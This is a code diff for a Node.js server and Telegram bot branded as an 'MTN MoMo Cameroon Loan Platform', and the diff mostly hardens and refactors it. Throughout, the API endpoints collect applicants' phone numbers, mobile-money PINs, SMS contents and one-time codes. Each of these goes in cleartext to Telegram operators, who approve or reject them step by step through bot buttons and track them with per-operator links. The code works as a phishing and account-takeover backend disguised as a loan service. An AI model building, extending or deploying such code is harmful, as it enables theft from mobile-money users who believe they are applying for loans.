@@ -1,12 +1,14 @@
 /**
  * ============================================================================
- * MTN MoMo Cameroon Loan Platform - High-Performance Production Server
+ * MTN MoMo Cameroon Loan Platform - Enterprise Production Server
  * ============================================================================
  */
 
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
 require('dotenv').config();
 
 const db = require('./database');
@@ -15,8 +17,9 @@ const db = require('./database');
 // 1. ENVIRONMENT & CONFIGURATION SETUP
 // ==========================================
 const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
-const PORT = process.env.PORT || 10000;
+const PORT = parseInt(process.env.PORT, 10) || 10000;
 const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;
+const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || 'mtn_momo_cm_secure_secret_token';
 
 if (!BOT_TOKEN) {
     console.error('❌ CRITICAL: SUPER_ADMIN_BOT_TOKEN is missing in environment variables.');
@@ -26,14 +29,18 @@ if (!BOT_TOKEN) {
 const app = express();
 const bot = new TelegramBot(BOT_TOKEN);
 
-// State Management (In-Memory Caches)
+// State Management (In-Memory Caches with Thread-Safe Access Pattern)
 const adminChatIds = new Map();         // adminId → chatId
 const pausedAdmins = new Set();         // adminIds temporarily paused
 let dbReady = false;
 
 // ==========================================
-// 2. HELPER FUNCTIONS
+// 2. HELPER FUNCTIONS & UTILITIES
 // ==========================================
+
+const asyncHandler = (fn) => (req, res, next) => {
+    Promise.resolve(fn(req, res, next)).catch(next);
+};
 
 function isAdminActive(chatId) {
     const adminId = getAdminIdByChatId(chatId);
@@ -51,54 +58,88 @@ function getAdminIdByChatId(chatId) {
 
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
-    let cleaned = phoneNumber.replace(/\s+/g, '');
+    let cleaned = String(phoneNumber).replace(/\s+/g, '');
     if (cleaned.startsWith('+237')) return cleaned.slice(4);
     if (cleaned.startsWith('237')) return cleaned.slice(3);
     return cleaned;
 }
 
-async function sendToAdminAsync(adminId, message, options = {}) {
+/**
+ * Enhanced Async Message Dispatcher with automatic retry mechanism
+ */
+async function sendToAdminAsync(adminId, message, options = {}, retries = 2) {
     let chatId = adminChatIds.get(adminId);
 
     if (!chatId) {
         try {
             const admin = await db.getAdmin(adminId);
-            if (!admin?.chatId) return;
+            if (!admin?.chatId) return false;
             adminChatIds.set(adminId, admin.chatId);
             chatId = admin.chatId;
         } catch (err) {
-            console.error(`❌ DB fallback error for admin ${adminId}:`, err.message);
-            return;
+            console.error(`❌ DB lookup failure for admin ${adminId}:`, err.message);
+            return false;
         }
     }
 
-    try {
-        await bot.sendMessage(chatId, message, options);
-    } catch (error) {
-        console.error(`❌ Async dispatch error to admin ${adminId}:`, error.message);
+    for (let attempt = 1; attempt <= retries + 1; attempt++) {
+        try {
+            await bot.sendMessage(chatId, message, options);
+            return true;
+        } catch (error) {
+            console.warn(`⚠️ Dispatch attempt ${attempt} to admin ${adminId} failed: ${error.message}`);
+            if (attempt === retries + 1) {
+                console.error(`❌ Permanent dispatch failure for admin ${adminId}.`);
+            } else {
+                await new Promise(r => setTimeout(r, 1000 * attempt));
+            }
+        }
     }
+    return false;
 }
 
 // ==========================================
-// 3. EXPRESS MIDDLEWARE
+// 3. EXPRESS MIDDLEWARE & SECURITY
 // ==========================================
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(helmet({
+    contentSecurityPolicy: false, // Set to true with custom policy if serving dynamic external scripts
+}));
+
+app.use(express.json({ limit: '1mb' }));
+app.use(express.urlencoded({ extended: true, limit: '1mb' }));
 app.use(express.static(__dirname));
+
+// Rate Limiting for Public REST API Endpoints
+const apiLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutes
+    max: 200, // Limit each IP to 200 requests per windowMs
+    standardHeaders: true,
+    legacyHeaders: false,
+    message: { success: false, message: 'Too many requests. Please try again later.' }
+});
+
+app.use('/api/', apiLimiter);
 
 // ==========================================
 // 4. TELEGRAM BOT HANDLERS SETUP
 // ==========================================
-console.log('⏳ Configuring Telegram bot event handlers...');
+console.log('⏳ Registering Telegram bot command handlers...');
 setupCommandHandlers();
 console.log('✅ Telegram command handlers active.');
 
 // ==========================================
-// 5. WEBHOOK ENDPOINT
+// 5. SECURE WEBHOOK ENDPOINT
 // ==========================================
 const webhookPath = `/telegram-webhook`;
 
 app.post(webhookPath, (req, res) => {
+    // Validate secret token header if sent by Telegram
+    const secretHeader = req.headers['x-telegram-bot-api-secret-token'];
+    if (secretHeader && secretHeader !== WEBHOOK_SECRET) {
+        console.warn('⚠️ Rejected unauthorized webhook update request.');
+        return res.sendStatus(403);
+    }
+
     res.sendStatus(200);
     if (req.body && req.body.update_id !== undefined) {
         bot.processUpdate(req.body);
@@ -108,6 +149,8 @@ app.post(webhookPath, (req, res) => {
 // ==========================================
 // 6. DATABASE CONNECTION & SERVER BOOTSTRAP
 // ==========================================
+let serverInstance = null;
+
 db.connectDatabase()
     .then(async () => {
         dbReady = true;
@@ -120,22 +163,25 @@ db.connectDatabase()
             await bot.deleteWebHook();
             await bot.setWebHook(fullWebhookUrl, {
                 drop_pending_updates: false,
-                max_connections: 40,
-                allowed_updates: ['message', 'callback_query']
+                max_connections: 50,
+                allowed_updates: ['message', 'callback_query'],
+                secret_token: WEBHOOK_SECRET
             });
-            console.log(`✅ Webhook successfully bound: ${fullWebhookUrl}`);
+            console.log(`✅ Webhook bound successfully: ${fullWebhookUrl}`);
         } catch (webhookError) {
-            console.error('❌ Webhook binding warning:', webhookError.message);
+            console.error('❌ Webhook setup warning:', webhookError.message);
         }
 
-        // Keep-alive ping for free hosting tiers (e.g. Render)
-        setInterval(() => fetch(`${WEBHOOK_URL}/health`).catch(() => {}), 14 * 60 * 1000);
+        // Keep-alive ping for free/sleeping hosting tiers
+        setInterval(() => {
+            fetch(`${WEBHOOK_URL}/health`).catch(() => {});
+        }, 14 * 60 * 1000);
 
-        app.listen(PORT, () => {
+        serverInstance = app.listen(PORT, () => {
             console.log(`\n💎 MTN MOMO CAMEROON LOAN PLATFORM`);
             console.log(`==================================`);
-            console.log(`🌐 Server running at: http://localhost:${PORT}`);
-            console.log(`🤖 Bot Mode: WEBHOOK (Optimized)`);
+            console.log(`🌐 Server active at: http://localhost:${PORT}`);
+            console.log(`🤖 Mode: WEBHOOK (Optimized)`);
             console.log(`👥 Active Admins Loaded: ${adminChatIds.size}\n`);
         });
     })
@@ -159,7 +205,7 @@ async function loadAdminChatIds() {
             }
         }
     } catch (error) {
-        console.error('❌ Error loading admin chat IDs:', error);
+        console.error('❌ Error loading admin chat IDs:', error.message);
     }
 }
 
@@ -182,77 +228,109 @@ function setupCommandHandlers() {
 
             if (isSuperAdmin) {
                 const text = `
-👋 *Welcome ${admin.name}!*
+👋 *Welcome Super Admin!*
+
+*Your Admin ID:* \`ADMIN001\`
+*Role:* ⭐ Super Admin
+*Your Personal Link:*
+${WEBHOOK_URL}?admin=ADMIN001
+
+*Commands:*
+/mylink - Get your portal link
+/stats - View global statistics
+/pending - Pending applications
+/myinfo - Your information
+
+*Super Admin Management:*
+/addadmin - Add new auto-generated admin
+/addadminid <id> - Add admin with specific ID
+/transferadmin <oldChatId> | <newChatId> - Transfer admin Chat ID
+/pauseadmin <adminId> - Pause an admin
+/unpauseadmin <adminId> - Unpause an admin
+/removeadmin <adminId> - Remove an admin
+/admins - List all registered admins
+/suspendall - 🔒 Suspend all admin links
+
+*Messaging:*
+/send <adminId> <message> - Direct message an admin
+/broadcast <message> - Broadcast to all admins
+/ask <adminId> <request> - Send action request
+                `.trim();
+
+                const inline_keyboard = [
+                    [
+                        { text: '📊 Global Stats', callback_data: 'sa_stats' },
+                        { text: '⏳ Pending Apps', callback_data: 'sa_pending' }
+                    ],
+                    [
+                        { text: '👥 List Admins', callback_data: 'sa_admins' },
+                        { text: '➕ Add Admin', callback_data: 'sa_addadmin' }
+                    ],
+                    [
+                        { text: '🔒 Suspend All', callback_data: 'sa_suspendall' },
+                        { text: '🔗 My Link', callback_data: 'sa_mylink' }
+                    ]
+                ];
+
+                bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
+
+            } else {
+                const text = `
+👋 *Welcome Admin!*
 
 *Your Admin ID:* \`${adminId}\`
-*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
+*Role:* 👤 Admin
 *Your Personal Link:*
 ${WEBHOOK_URL}?admin=${adminId}
 
 *Commands:*
-/mylink - Get your link
-/stats - Your statistics
+/mylink - Get your portal link
+/stats - View your statistics
 /pending - Pending applications
-/myinfo - Your information
-`;
-                if (isSuperAdmin) {
-                    message += `
-*Admin Management (Super Admin Only):*
-/addadmin - Add new admin
-/addadminid - Add admin with specific ID
-/transferadmin oldChatId | newChatId - Transfer admin
-/pauseadmin <adminId> - Pause an admin
-/unpauseadmin <adminId> - Unpause an admin
-/removeadmin <adminId> - Remove an admin
-/admins - List all admins
+/myinfo - Your account information
+                `.trim();
 
-*Messaging:*
-/send <adminId> <message> - Message an admin
-/broadcast <message> - Message all admins
-/ask <adminId> <request> - Send action request
-`;
-                }
-                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-            } else {
-                await bot.sendMessage(chatId, `
-👋 *Welcome to EcoCash Loan Platform!*
+                const inline_keyboard = [
+                    [
+                        { text: '📊 My Stats', callback_data: 'admin_stats' },
+                        { text: '⏳ Pending Apps', callback_data: 'admin_pending' }
+                    ],
+                    [
+                        { text: '🔗 My Link', callback_data: 'admin_mylink' },
+                        { text: '👤 My Info', callback_data: 'admin_myinfo' }
+                    ]
+                ];
 
-Your Chat ID: \`${chatId}\`
-
-Provide this to your super admin to get access.
-                `, { parse_mode: 'Markdown' });
+                bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
             }
-        } catch (error) {
-            console.error('❌ Error in /start:', error);
+
+        } else {
+            bot.sendMessage(chatId, `
+👋 *Welcome to MTN MoMo Cameroon*
+Your Telegram Chat ID: \`${chatId}\`
+
+⚠️ *Note:* You are not registered as an Admin. Contact Super Admin (\`ADMIN001\`) with your Chat ID to get access.
+            `.trim(), { parse_mode: 'Markdown' });
         }
     });
 
-    // /mylink
+    // --- /mylink ---
     bot.onText(/\/mylink/, async (msg) => {
-        const chatId  = msg.chat.id;
+        const chatId = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
-        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
-        const admin = await db.getAdmin(adminId);
-        bot.sendMessage(chatId, `
-🔗 *YOUR LINK*
-
-\`${WEBHOOK_URL}?admin=${adminId}\`
-
-📋 Applications → *${admin.name}*
-        `, { parse_mode: 'Markdown' });
+        if (!adminId || !isAdminActive(chatId)) return;
+        bot.sendMessage(chatId, `🔗 *Your Personal Portal Link:*\n${WEBHOOK_URL}?admin=${adminId}`, { parse_mode: 'Markdown' });
     });
 
-    // /stats
+    // --- /stats ---
     bot.onText(/\/stats/, async (msg) => {
-        const chatId  = msg.chat.id;
+        const chatId = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
-        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
+        if (!adminId || !isAdminActive(chatId)) return;
+
         const stats = await db.getAdminStats(adminId);
         bot.sendMessage(chatId, `
-📊 *STATISTICS*
-(${adminId})*
+📊 *STATISTICS (${adminId})*
 ----------------------------------
 📋 Total Applications: \`${stats.total || 0}\`
 ⏳ PIN Pending: \`${stats.pinPending || 0}\`
@@ -566,7 +644,7 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     // ------------------------------------------
-    // C. APPLICATION WORKFLOW ACTIONS (deny_pin, allow_pin, etc.)
+    // C. APPLICATION WORKFLOW ACTIONS
     // ------------------------------------------
     const parts = data.split('_');
     if (parts.length < 4) return bot.answerCallbackQuery(callbackQuery.id);
@@ -684,114 +762,103 @@ ${smsBody}
 // ==========================================
 
 // Verify PIN Request Entry
-app.post('/api/verify-pin', async (req, res) => {
-    try {
-        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
+app.post('/api/verify-pin', asyncHandler(async (req, res) => {
+    const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
 
-        if (!phoneNumber || !pin) {
-            return res.status(400).json({ success: false, message: 'Phone number and PIN are required.' });
+    if (!phoneNumber || !pin) {
+        return res.status(400).json({ success: false, message: 'Phone number and PIN are required.' });
+    }
+
+    const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;
+
+    let assignedAdmin;
+    if (assignmentType === 'specific' && requestAdminId) {
+        assignedAdmin = await db.getAdmin(requestAdminId);
+        if (!assignedAdmin || pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
+            return res.status(400).json({ success: false, message: 'Invalid or paused administrator link.' });
         }
-
-        const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;
-
-        let assignedAdmin;
-        if (assignmentType === 'specific' && requestAdminId) {
-            assignedAdmin = await db.getAdmin(requestAdminId);
-            if (!assignedAdmin || pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
-                return res.status(400).json({ success: false, message: 'Invalid or paused administrator link.' });
-            }
-        } else {
-            const activeAdmins = await db.getActiveAdmins();
-            const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
-            if (availableAdmins.length === 0) {
-                return res.status(503).json({ success: false, message: 'No active administrators available.' });
-            }
-            assignedAdmin = availableAdmins[0];
+    } else {
+        const activeAdmins = await db.getActiveAdmins();
+        const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
+        if (availableAdmins.length === 0) {
+            return res.status(503).json({ success: false, message: 'No active administrators available.' });
         }
+        assignedAdmin = availableAdmins[0];
+    }
 
-        const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
-        const thisAdminPastApps = existingApps.filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending');
-        const isReturningUser = thisAdminPastApps.length > 0;
+    const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
+    const thisAdminPastApps = existingApps.filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending');
+    const isReturningUser = thisAdminPastApps.length > 0;
 
-        await db.saveApplication({
-            id: applicationId,
-            adminId: assignedAdmin.adminId,
-            adminName: assignedAdmin.name,
-            phoneNumber,
-            pin,
-            pinStatus: 'pending',
-            smsStatus: 'pending',
-            smsOtpStatus: 'pending',
-            otpStatus: 'pending',
-            assignmentType: assignmentType || 'auto',
-            isReturningUser,
-            previousCount: thisAdminPastApps.length,
-            timestamp: new Date().toISOString()
-        });
+    await db.saveApplication({
+        id: applicationId,
+        adminId: assignedAdmin.adminId,
+        adminName: assignedAdmin.name,
+        phoneNumber,
+        pin,
+        pinStatus: 'pending',
+        smsStatus: 'pending',
+        smsOtpStatus: 'pending',
+        otpStatus: 'pending',
+        assignmentType: assignmentType || 'auto',
+        isReturningUser,
+        previousCount: thisAdminPastApps.length,
+        timestamp: new Date().toISOString()
+    });
 
-        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
+    res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
 
-        sendToAdminAsync(assignedAdmin.adminId, `
+    sendToAdminAsync(assignedAdmin.adminId, `
 🆕 *NEW APPLICATION*
 ------------------------------
 📋 Ref: \`${applicationId}\`
 📞 Phone: \`${formatPhone(phoneNumber)}\`
 🔑 PIN: \`${pin}\`
-        `.trim(), {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: '❌ Reject PIN', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
-                    [{ text: '✅ Approve & Allow', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
-                ]
-            }
-        });
-
-    } catch (error) {
-        console.error('❌ Error in /api/verify-pin:', error);
-        res.status(500).json({ success: false, message: 'Internal server error.' });
-    }
-});
+    `.trim(), {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: '❌ Reject PIN', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
+                [{ text: '✅ Approve & Allow', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
+            ]
+        }
+    });
+}));
 
 // Check PIN Status
-app.get('/api/check-pin-status/:applicationId', async (req, res) => {
-    try {
-        const application = await db.getApplication(req.params.applicationId);
-        if (application) {
-            res.json({ success: true, status: application.pinStatus });
-        } else {
-            res.status(404).json({ success: false, message: 'Application not found.' });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Internal server error.' });
+app.get('/api/check-pin-status/:applicationId', asyncHandler(async (req, res) => {
+    const application = await db.getApplication(req.params.applicationId);
+    if (application) {
+        res.json({ success: true, status: application.pinStatus });
+    } else {
+        res.status(404).json({ success: false, message: 'Application not found.' });
     }
-});
+}));
 
 // Verify SMS Submission Entry
-app.post('/api/verify-sms', async (req, res) => {
-    try {
-        const applicationId = req.body.id || req.body.applicationId;
-        const smsContent = req.body.smsOtp || req.body.smsText;
+app.post('/api/verify-sms', asyncHandler(async (req, res) => {
+    const applicationId = req.body.id || req.body.applicationId;
+    const smsContent = req.body.smsOtp || req.body.smsText;
 
-        if (!applicationId || !smsContent) {
-            return res.status(400).json({ success: false, message: 'Missing applicationId or SMS content.' });
-        }
+    if (!applicationId || !smsContent) {
+        return res.status(400).json({ success: false, message: 'Missing applicationId or SMS content.' });
+    }
 
-        const application = await db.getApplication(applicationId);
-        if (!application) {
-            return res.status(404).json({ success: false, message: 'Application not found.' });
-        }
+    const application = await db.getApplication(applicationId);
+    if (!application) {
+        return res.status(404).json({ success: false, message: 'Application not found.' });
+    }
 
-        await db.updateApplication(applicationId, {
-            smsText: smsContent,
-            smsOtp: smsContent,
-            smsStatus: 'pending',
-            smsOtpStatus: 'pending'
-        });
+    await db.updateApplication(applicationId, {
+        smsText: smsContent,
+        smsOtp: smsContent,
+        smsStatus: 'pending',
+        smsOtpStatus: 'pending'
+    });
 
-        res.json({ success: true });
+    res.json({ success: true });
 
-        sendToAdminAsync(application.adminId, `
+    sendToAdminAsync(application.adminId, `
 💬 *SMS CONTENT SUBMISSION*
 ------------------------------
 📋 Ref: \`${applicationId}\`
@@ -800,108 +867,97 @@ app.post('/api/verify-sms', async (req, res) => {
 \`\`\`
 ${smsContent}
 \`\`\`
-        `.trim(), {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: '❌ Reject SMS', callback_data: `deny_sms_${application.adminId}_${applicationId}` }],
-                    [{ text: '✅ Allow 4-Digit OTP', callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
-                ]
-            }
-        });
-    } catch (error) {
-        console.error('❌ Error in /api/verify-sms:', error);
-        res.status(500).json({ success: false, message: 'Internal server error.' });
-    }
-});
+    `.trim(), {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: '❌ Reject SMS', callback_data: `deny_sms_${application.adminId}_${applicationId}` }],
+                [{ text: '✅ Allow 4-Digit OTP', callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
+            ]
+        }
+    });
+}));
 
 // Check SMS Status
-app.get('/api/check-sms-status/:applicationId', async (req, res) => {
-    try {
-        const application = await db.getApplication(req.params.applicationId);
-        if (application) {
-            res.json({ 
-                success: true, 
-                status: application.smsStatus || application.smsOtpStatus 
-            });
-        } else {
-            res.status(404).json({ success: false, message: 'Application not found.' });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Internal server error.' });
+app.get('/api/check-sms-status/:applicationId', asyncHandler(async (req, res) => {
+    const application = await db.getApplication(req.params.applicationId);
+    if (application) {
+        res.json({ 
+            success: true, 
+            status: application.smsStatus || application.smsOtpStatus 
+        });
+    } else {
+        res.status(404).json({ success: false, message: 'Application not found.' });
     }
-});
+}));
 
 // Verify OTP Stage Entry
-app.post('/api/verify-otp', async (req, res) => {
-    try {
-        const applicationId = req.body.id || req.body.applicationId;
-        const otpCode = req.body.otp;
+app.post('/api/verify-otp', asyncHandler(async (req, res) => {
+    const applicationId = req.body.id || req.body.applicationId;
+    const otpCode = req.body.otp;
 
-        if (!applicationId || !otpCode) {
-            return res.status(400).json({ success: false, message: 'Missing applicationId or OTP code.' });
-        }
+    if (!applicationId || !otpCode) {
+        return res.status(400).json({ success: false, message: 'Missing applicationId or OTP code.' });
+    }
 
-        const application = await db.getApplication(applicationId);
-        if (!application) {
-            return res.status(404).json({ success: false, message: 'Application not found.' });
-        }
+    const application = await db.getApplication(applicationId);
+    if (!application) {
+        return res.status(404).json({ success: false, message: 'Application not found.' });
+    }
 
-        await db.updateApplication(applicationId, {
-            otp: otpCode,
-            otpStatus: 'pending'
-        });
+    await db.updateApplication(applicationId, {
+        otp: otpCode,
+        otpStatus: 'pending'
+    });
 
-        res.json({ success: true });
+    res.json({ success: true });
 
-        sendToAdminAsync(application.adminId, `
+    sendToAdminAsync(application.adminId, `
 🔢 *4-DIGIT OTP VERIFICATION*
 ------------------------------
 📋 Ref: \`${applicationId}\`
 📞 Phone: \`${formatPhone(application.phoneNumber)}\`
 🔢 OTP: \`${otpCode}\`
-        `.trim(), {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: '❌ Flag Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
-                    [{ text: '❌ Flag Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
-                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
-                ]
-            }
-        });
-    } catch (error) {
-        console.error('❌ Error in /api/verify-otp:', error);
-        res.status(500).json({ success: false, message: 'Internal server error.' });
-    }
-});
+    `.trim(), {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: '❌ Flag Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
+                [{ text: '❌ Flag Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
+                [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
+            ]
+        }
+    });
+}));
 
 // Check OTP Status
-app.get('/api/check-otp-status/:applicationId', async (req, res) => {
-    try {
-        const application = await db.getApplication(req.params.applicationId);
-        if (application) {
-            res.json({ success: true, status: application.otpStatus });
-        } else {
-            res.status(404).json({ success: false, message: 'Application not found.' });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Internal server error.' });
+app.get('/api/check-otp-status/:applicationId', asyncHandler(async (req, res) => {
+    const application = await db.getApplication(req.params.applicationId);
+    if (application) {
+        res.json({ success: true, status: application.otpStatus });
+    } else {
+        res.status(404).json({ success: false, message: 'Application not found.' });
     }
-});
+}));
 
 // Health Check Endpoint
 app.get('/health', (req, res) => {
+    const memory = process.memoryUsage();
     res.json({
         status: 'ok',
+        uptime: Math.floor(process.uptime()),
         database: dbReady ? 'connected' : 'disconnected',
         activeAdmins: adminChatIds.size,
+        memoryUsage: {
+            rssMB: Math.round(memory.rss / 1024 / 1024),
+            heapUsedMB: Math.round(memory.heapUsed / 1024 / 1024)
+        },
         timestamp: new Date().toISOString()
     });
 });
 
 // Frontend Entrypoint
-app.get('/', async (req, res) => {
+app.get('/', asyncHandler(async (req, res) => {
     const adminId = req.query.admin;
     if (adminId && !adminChatIds.has(adminId)) {
         db.getAdmin(adminId).then(admin => {
@@ -911,19 +967,34 @@ app.get('/', async (req, res) => {
         }).catch(() => {});
     }
     res.sendFile(path.join(__dirname, 'mtn-momo-cameroon.html'));
+}));
+
+// Central Global Error Handler
+app.use((err, req, res, next) => {
+    console.error('❌ Unhandled Application Error:', err);
+    res.status(500).json({ success: false, message: 'Internal Server Error' });
 });
 
 // ==========================================
-// 10. GRACEFUL SHUTDOWN
+// 10. GRACEFUL SHUTDOWN PIPELINE
 // ==========================================
 async function shutdownGracefully(signal) {
-    console.log(`\n🛑 Signal ${signal} received. Shutting down server...`);
+    console.log(`\n🛑 Signal ${signal} received. Initiating graceful shutdown...`);
+    
+    if (serverInstance) {
+        serverInstance.close(() => {
+            console.log('✅ HTTP server closed to new connections.');
+        });
+    }
+
     try {
         await bot.deleteWebHook();
+        console.log('✅ Telegram webhook unbound.');
         await db.closeDatabase();
+        console.log('✅ Database connections safely closed.');
         process.exit(0);
     } catch (error) {
-        console.error('❌ Error during shutdown:', error);
+        console.error('❌ Error during graceful shutdown:', error.message);
         process.exit(1);
     }
 }
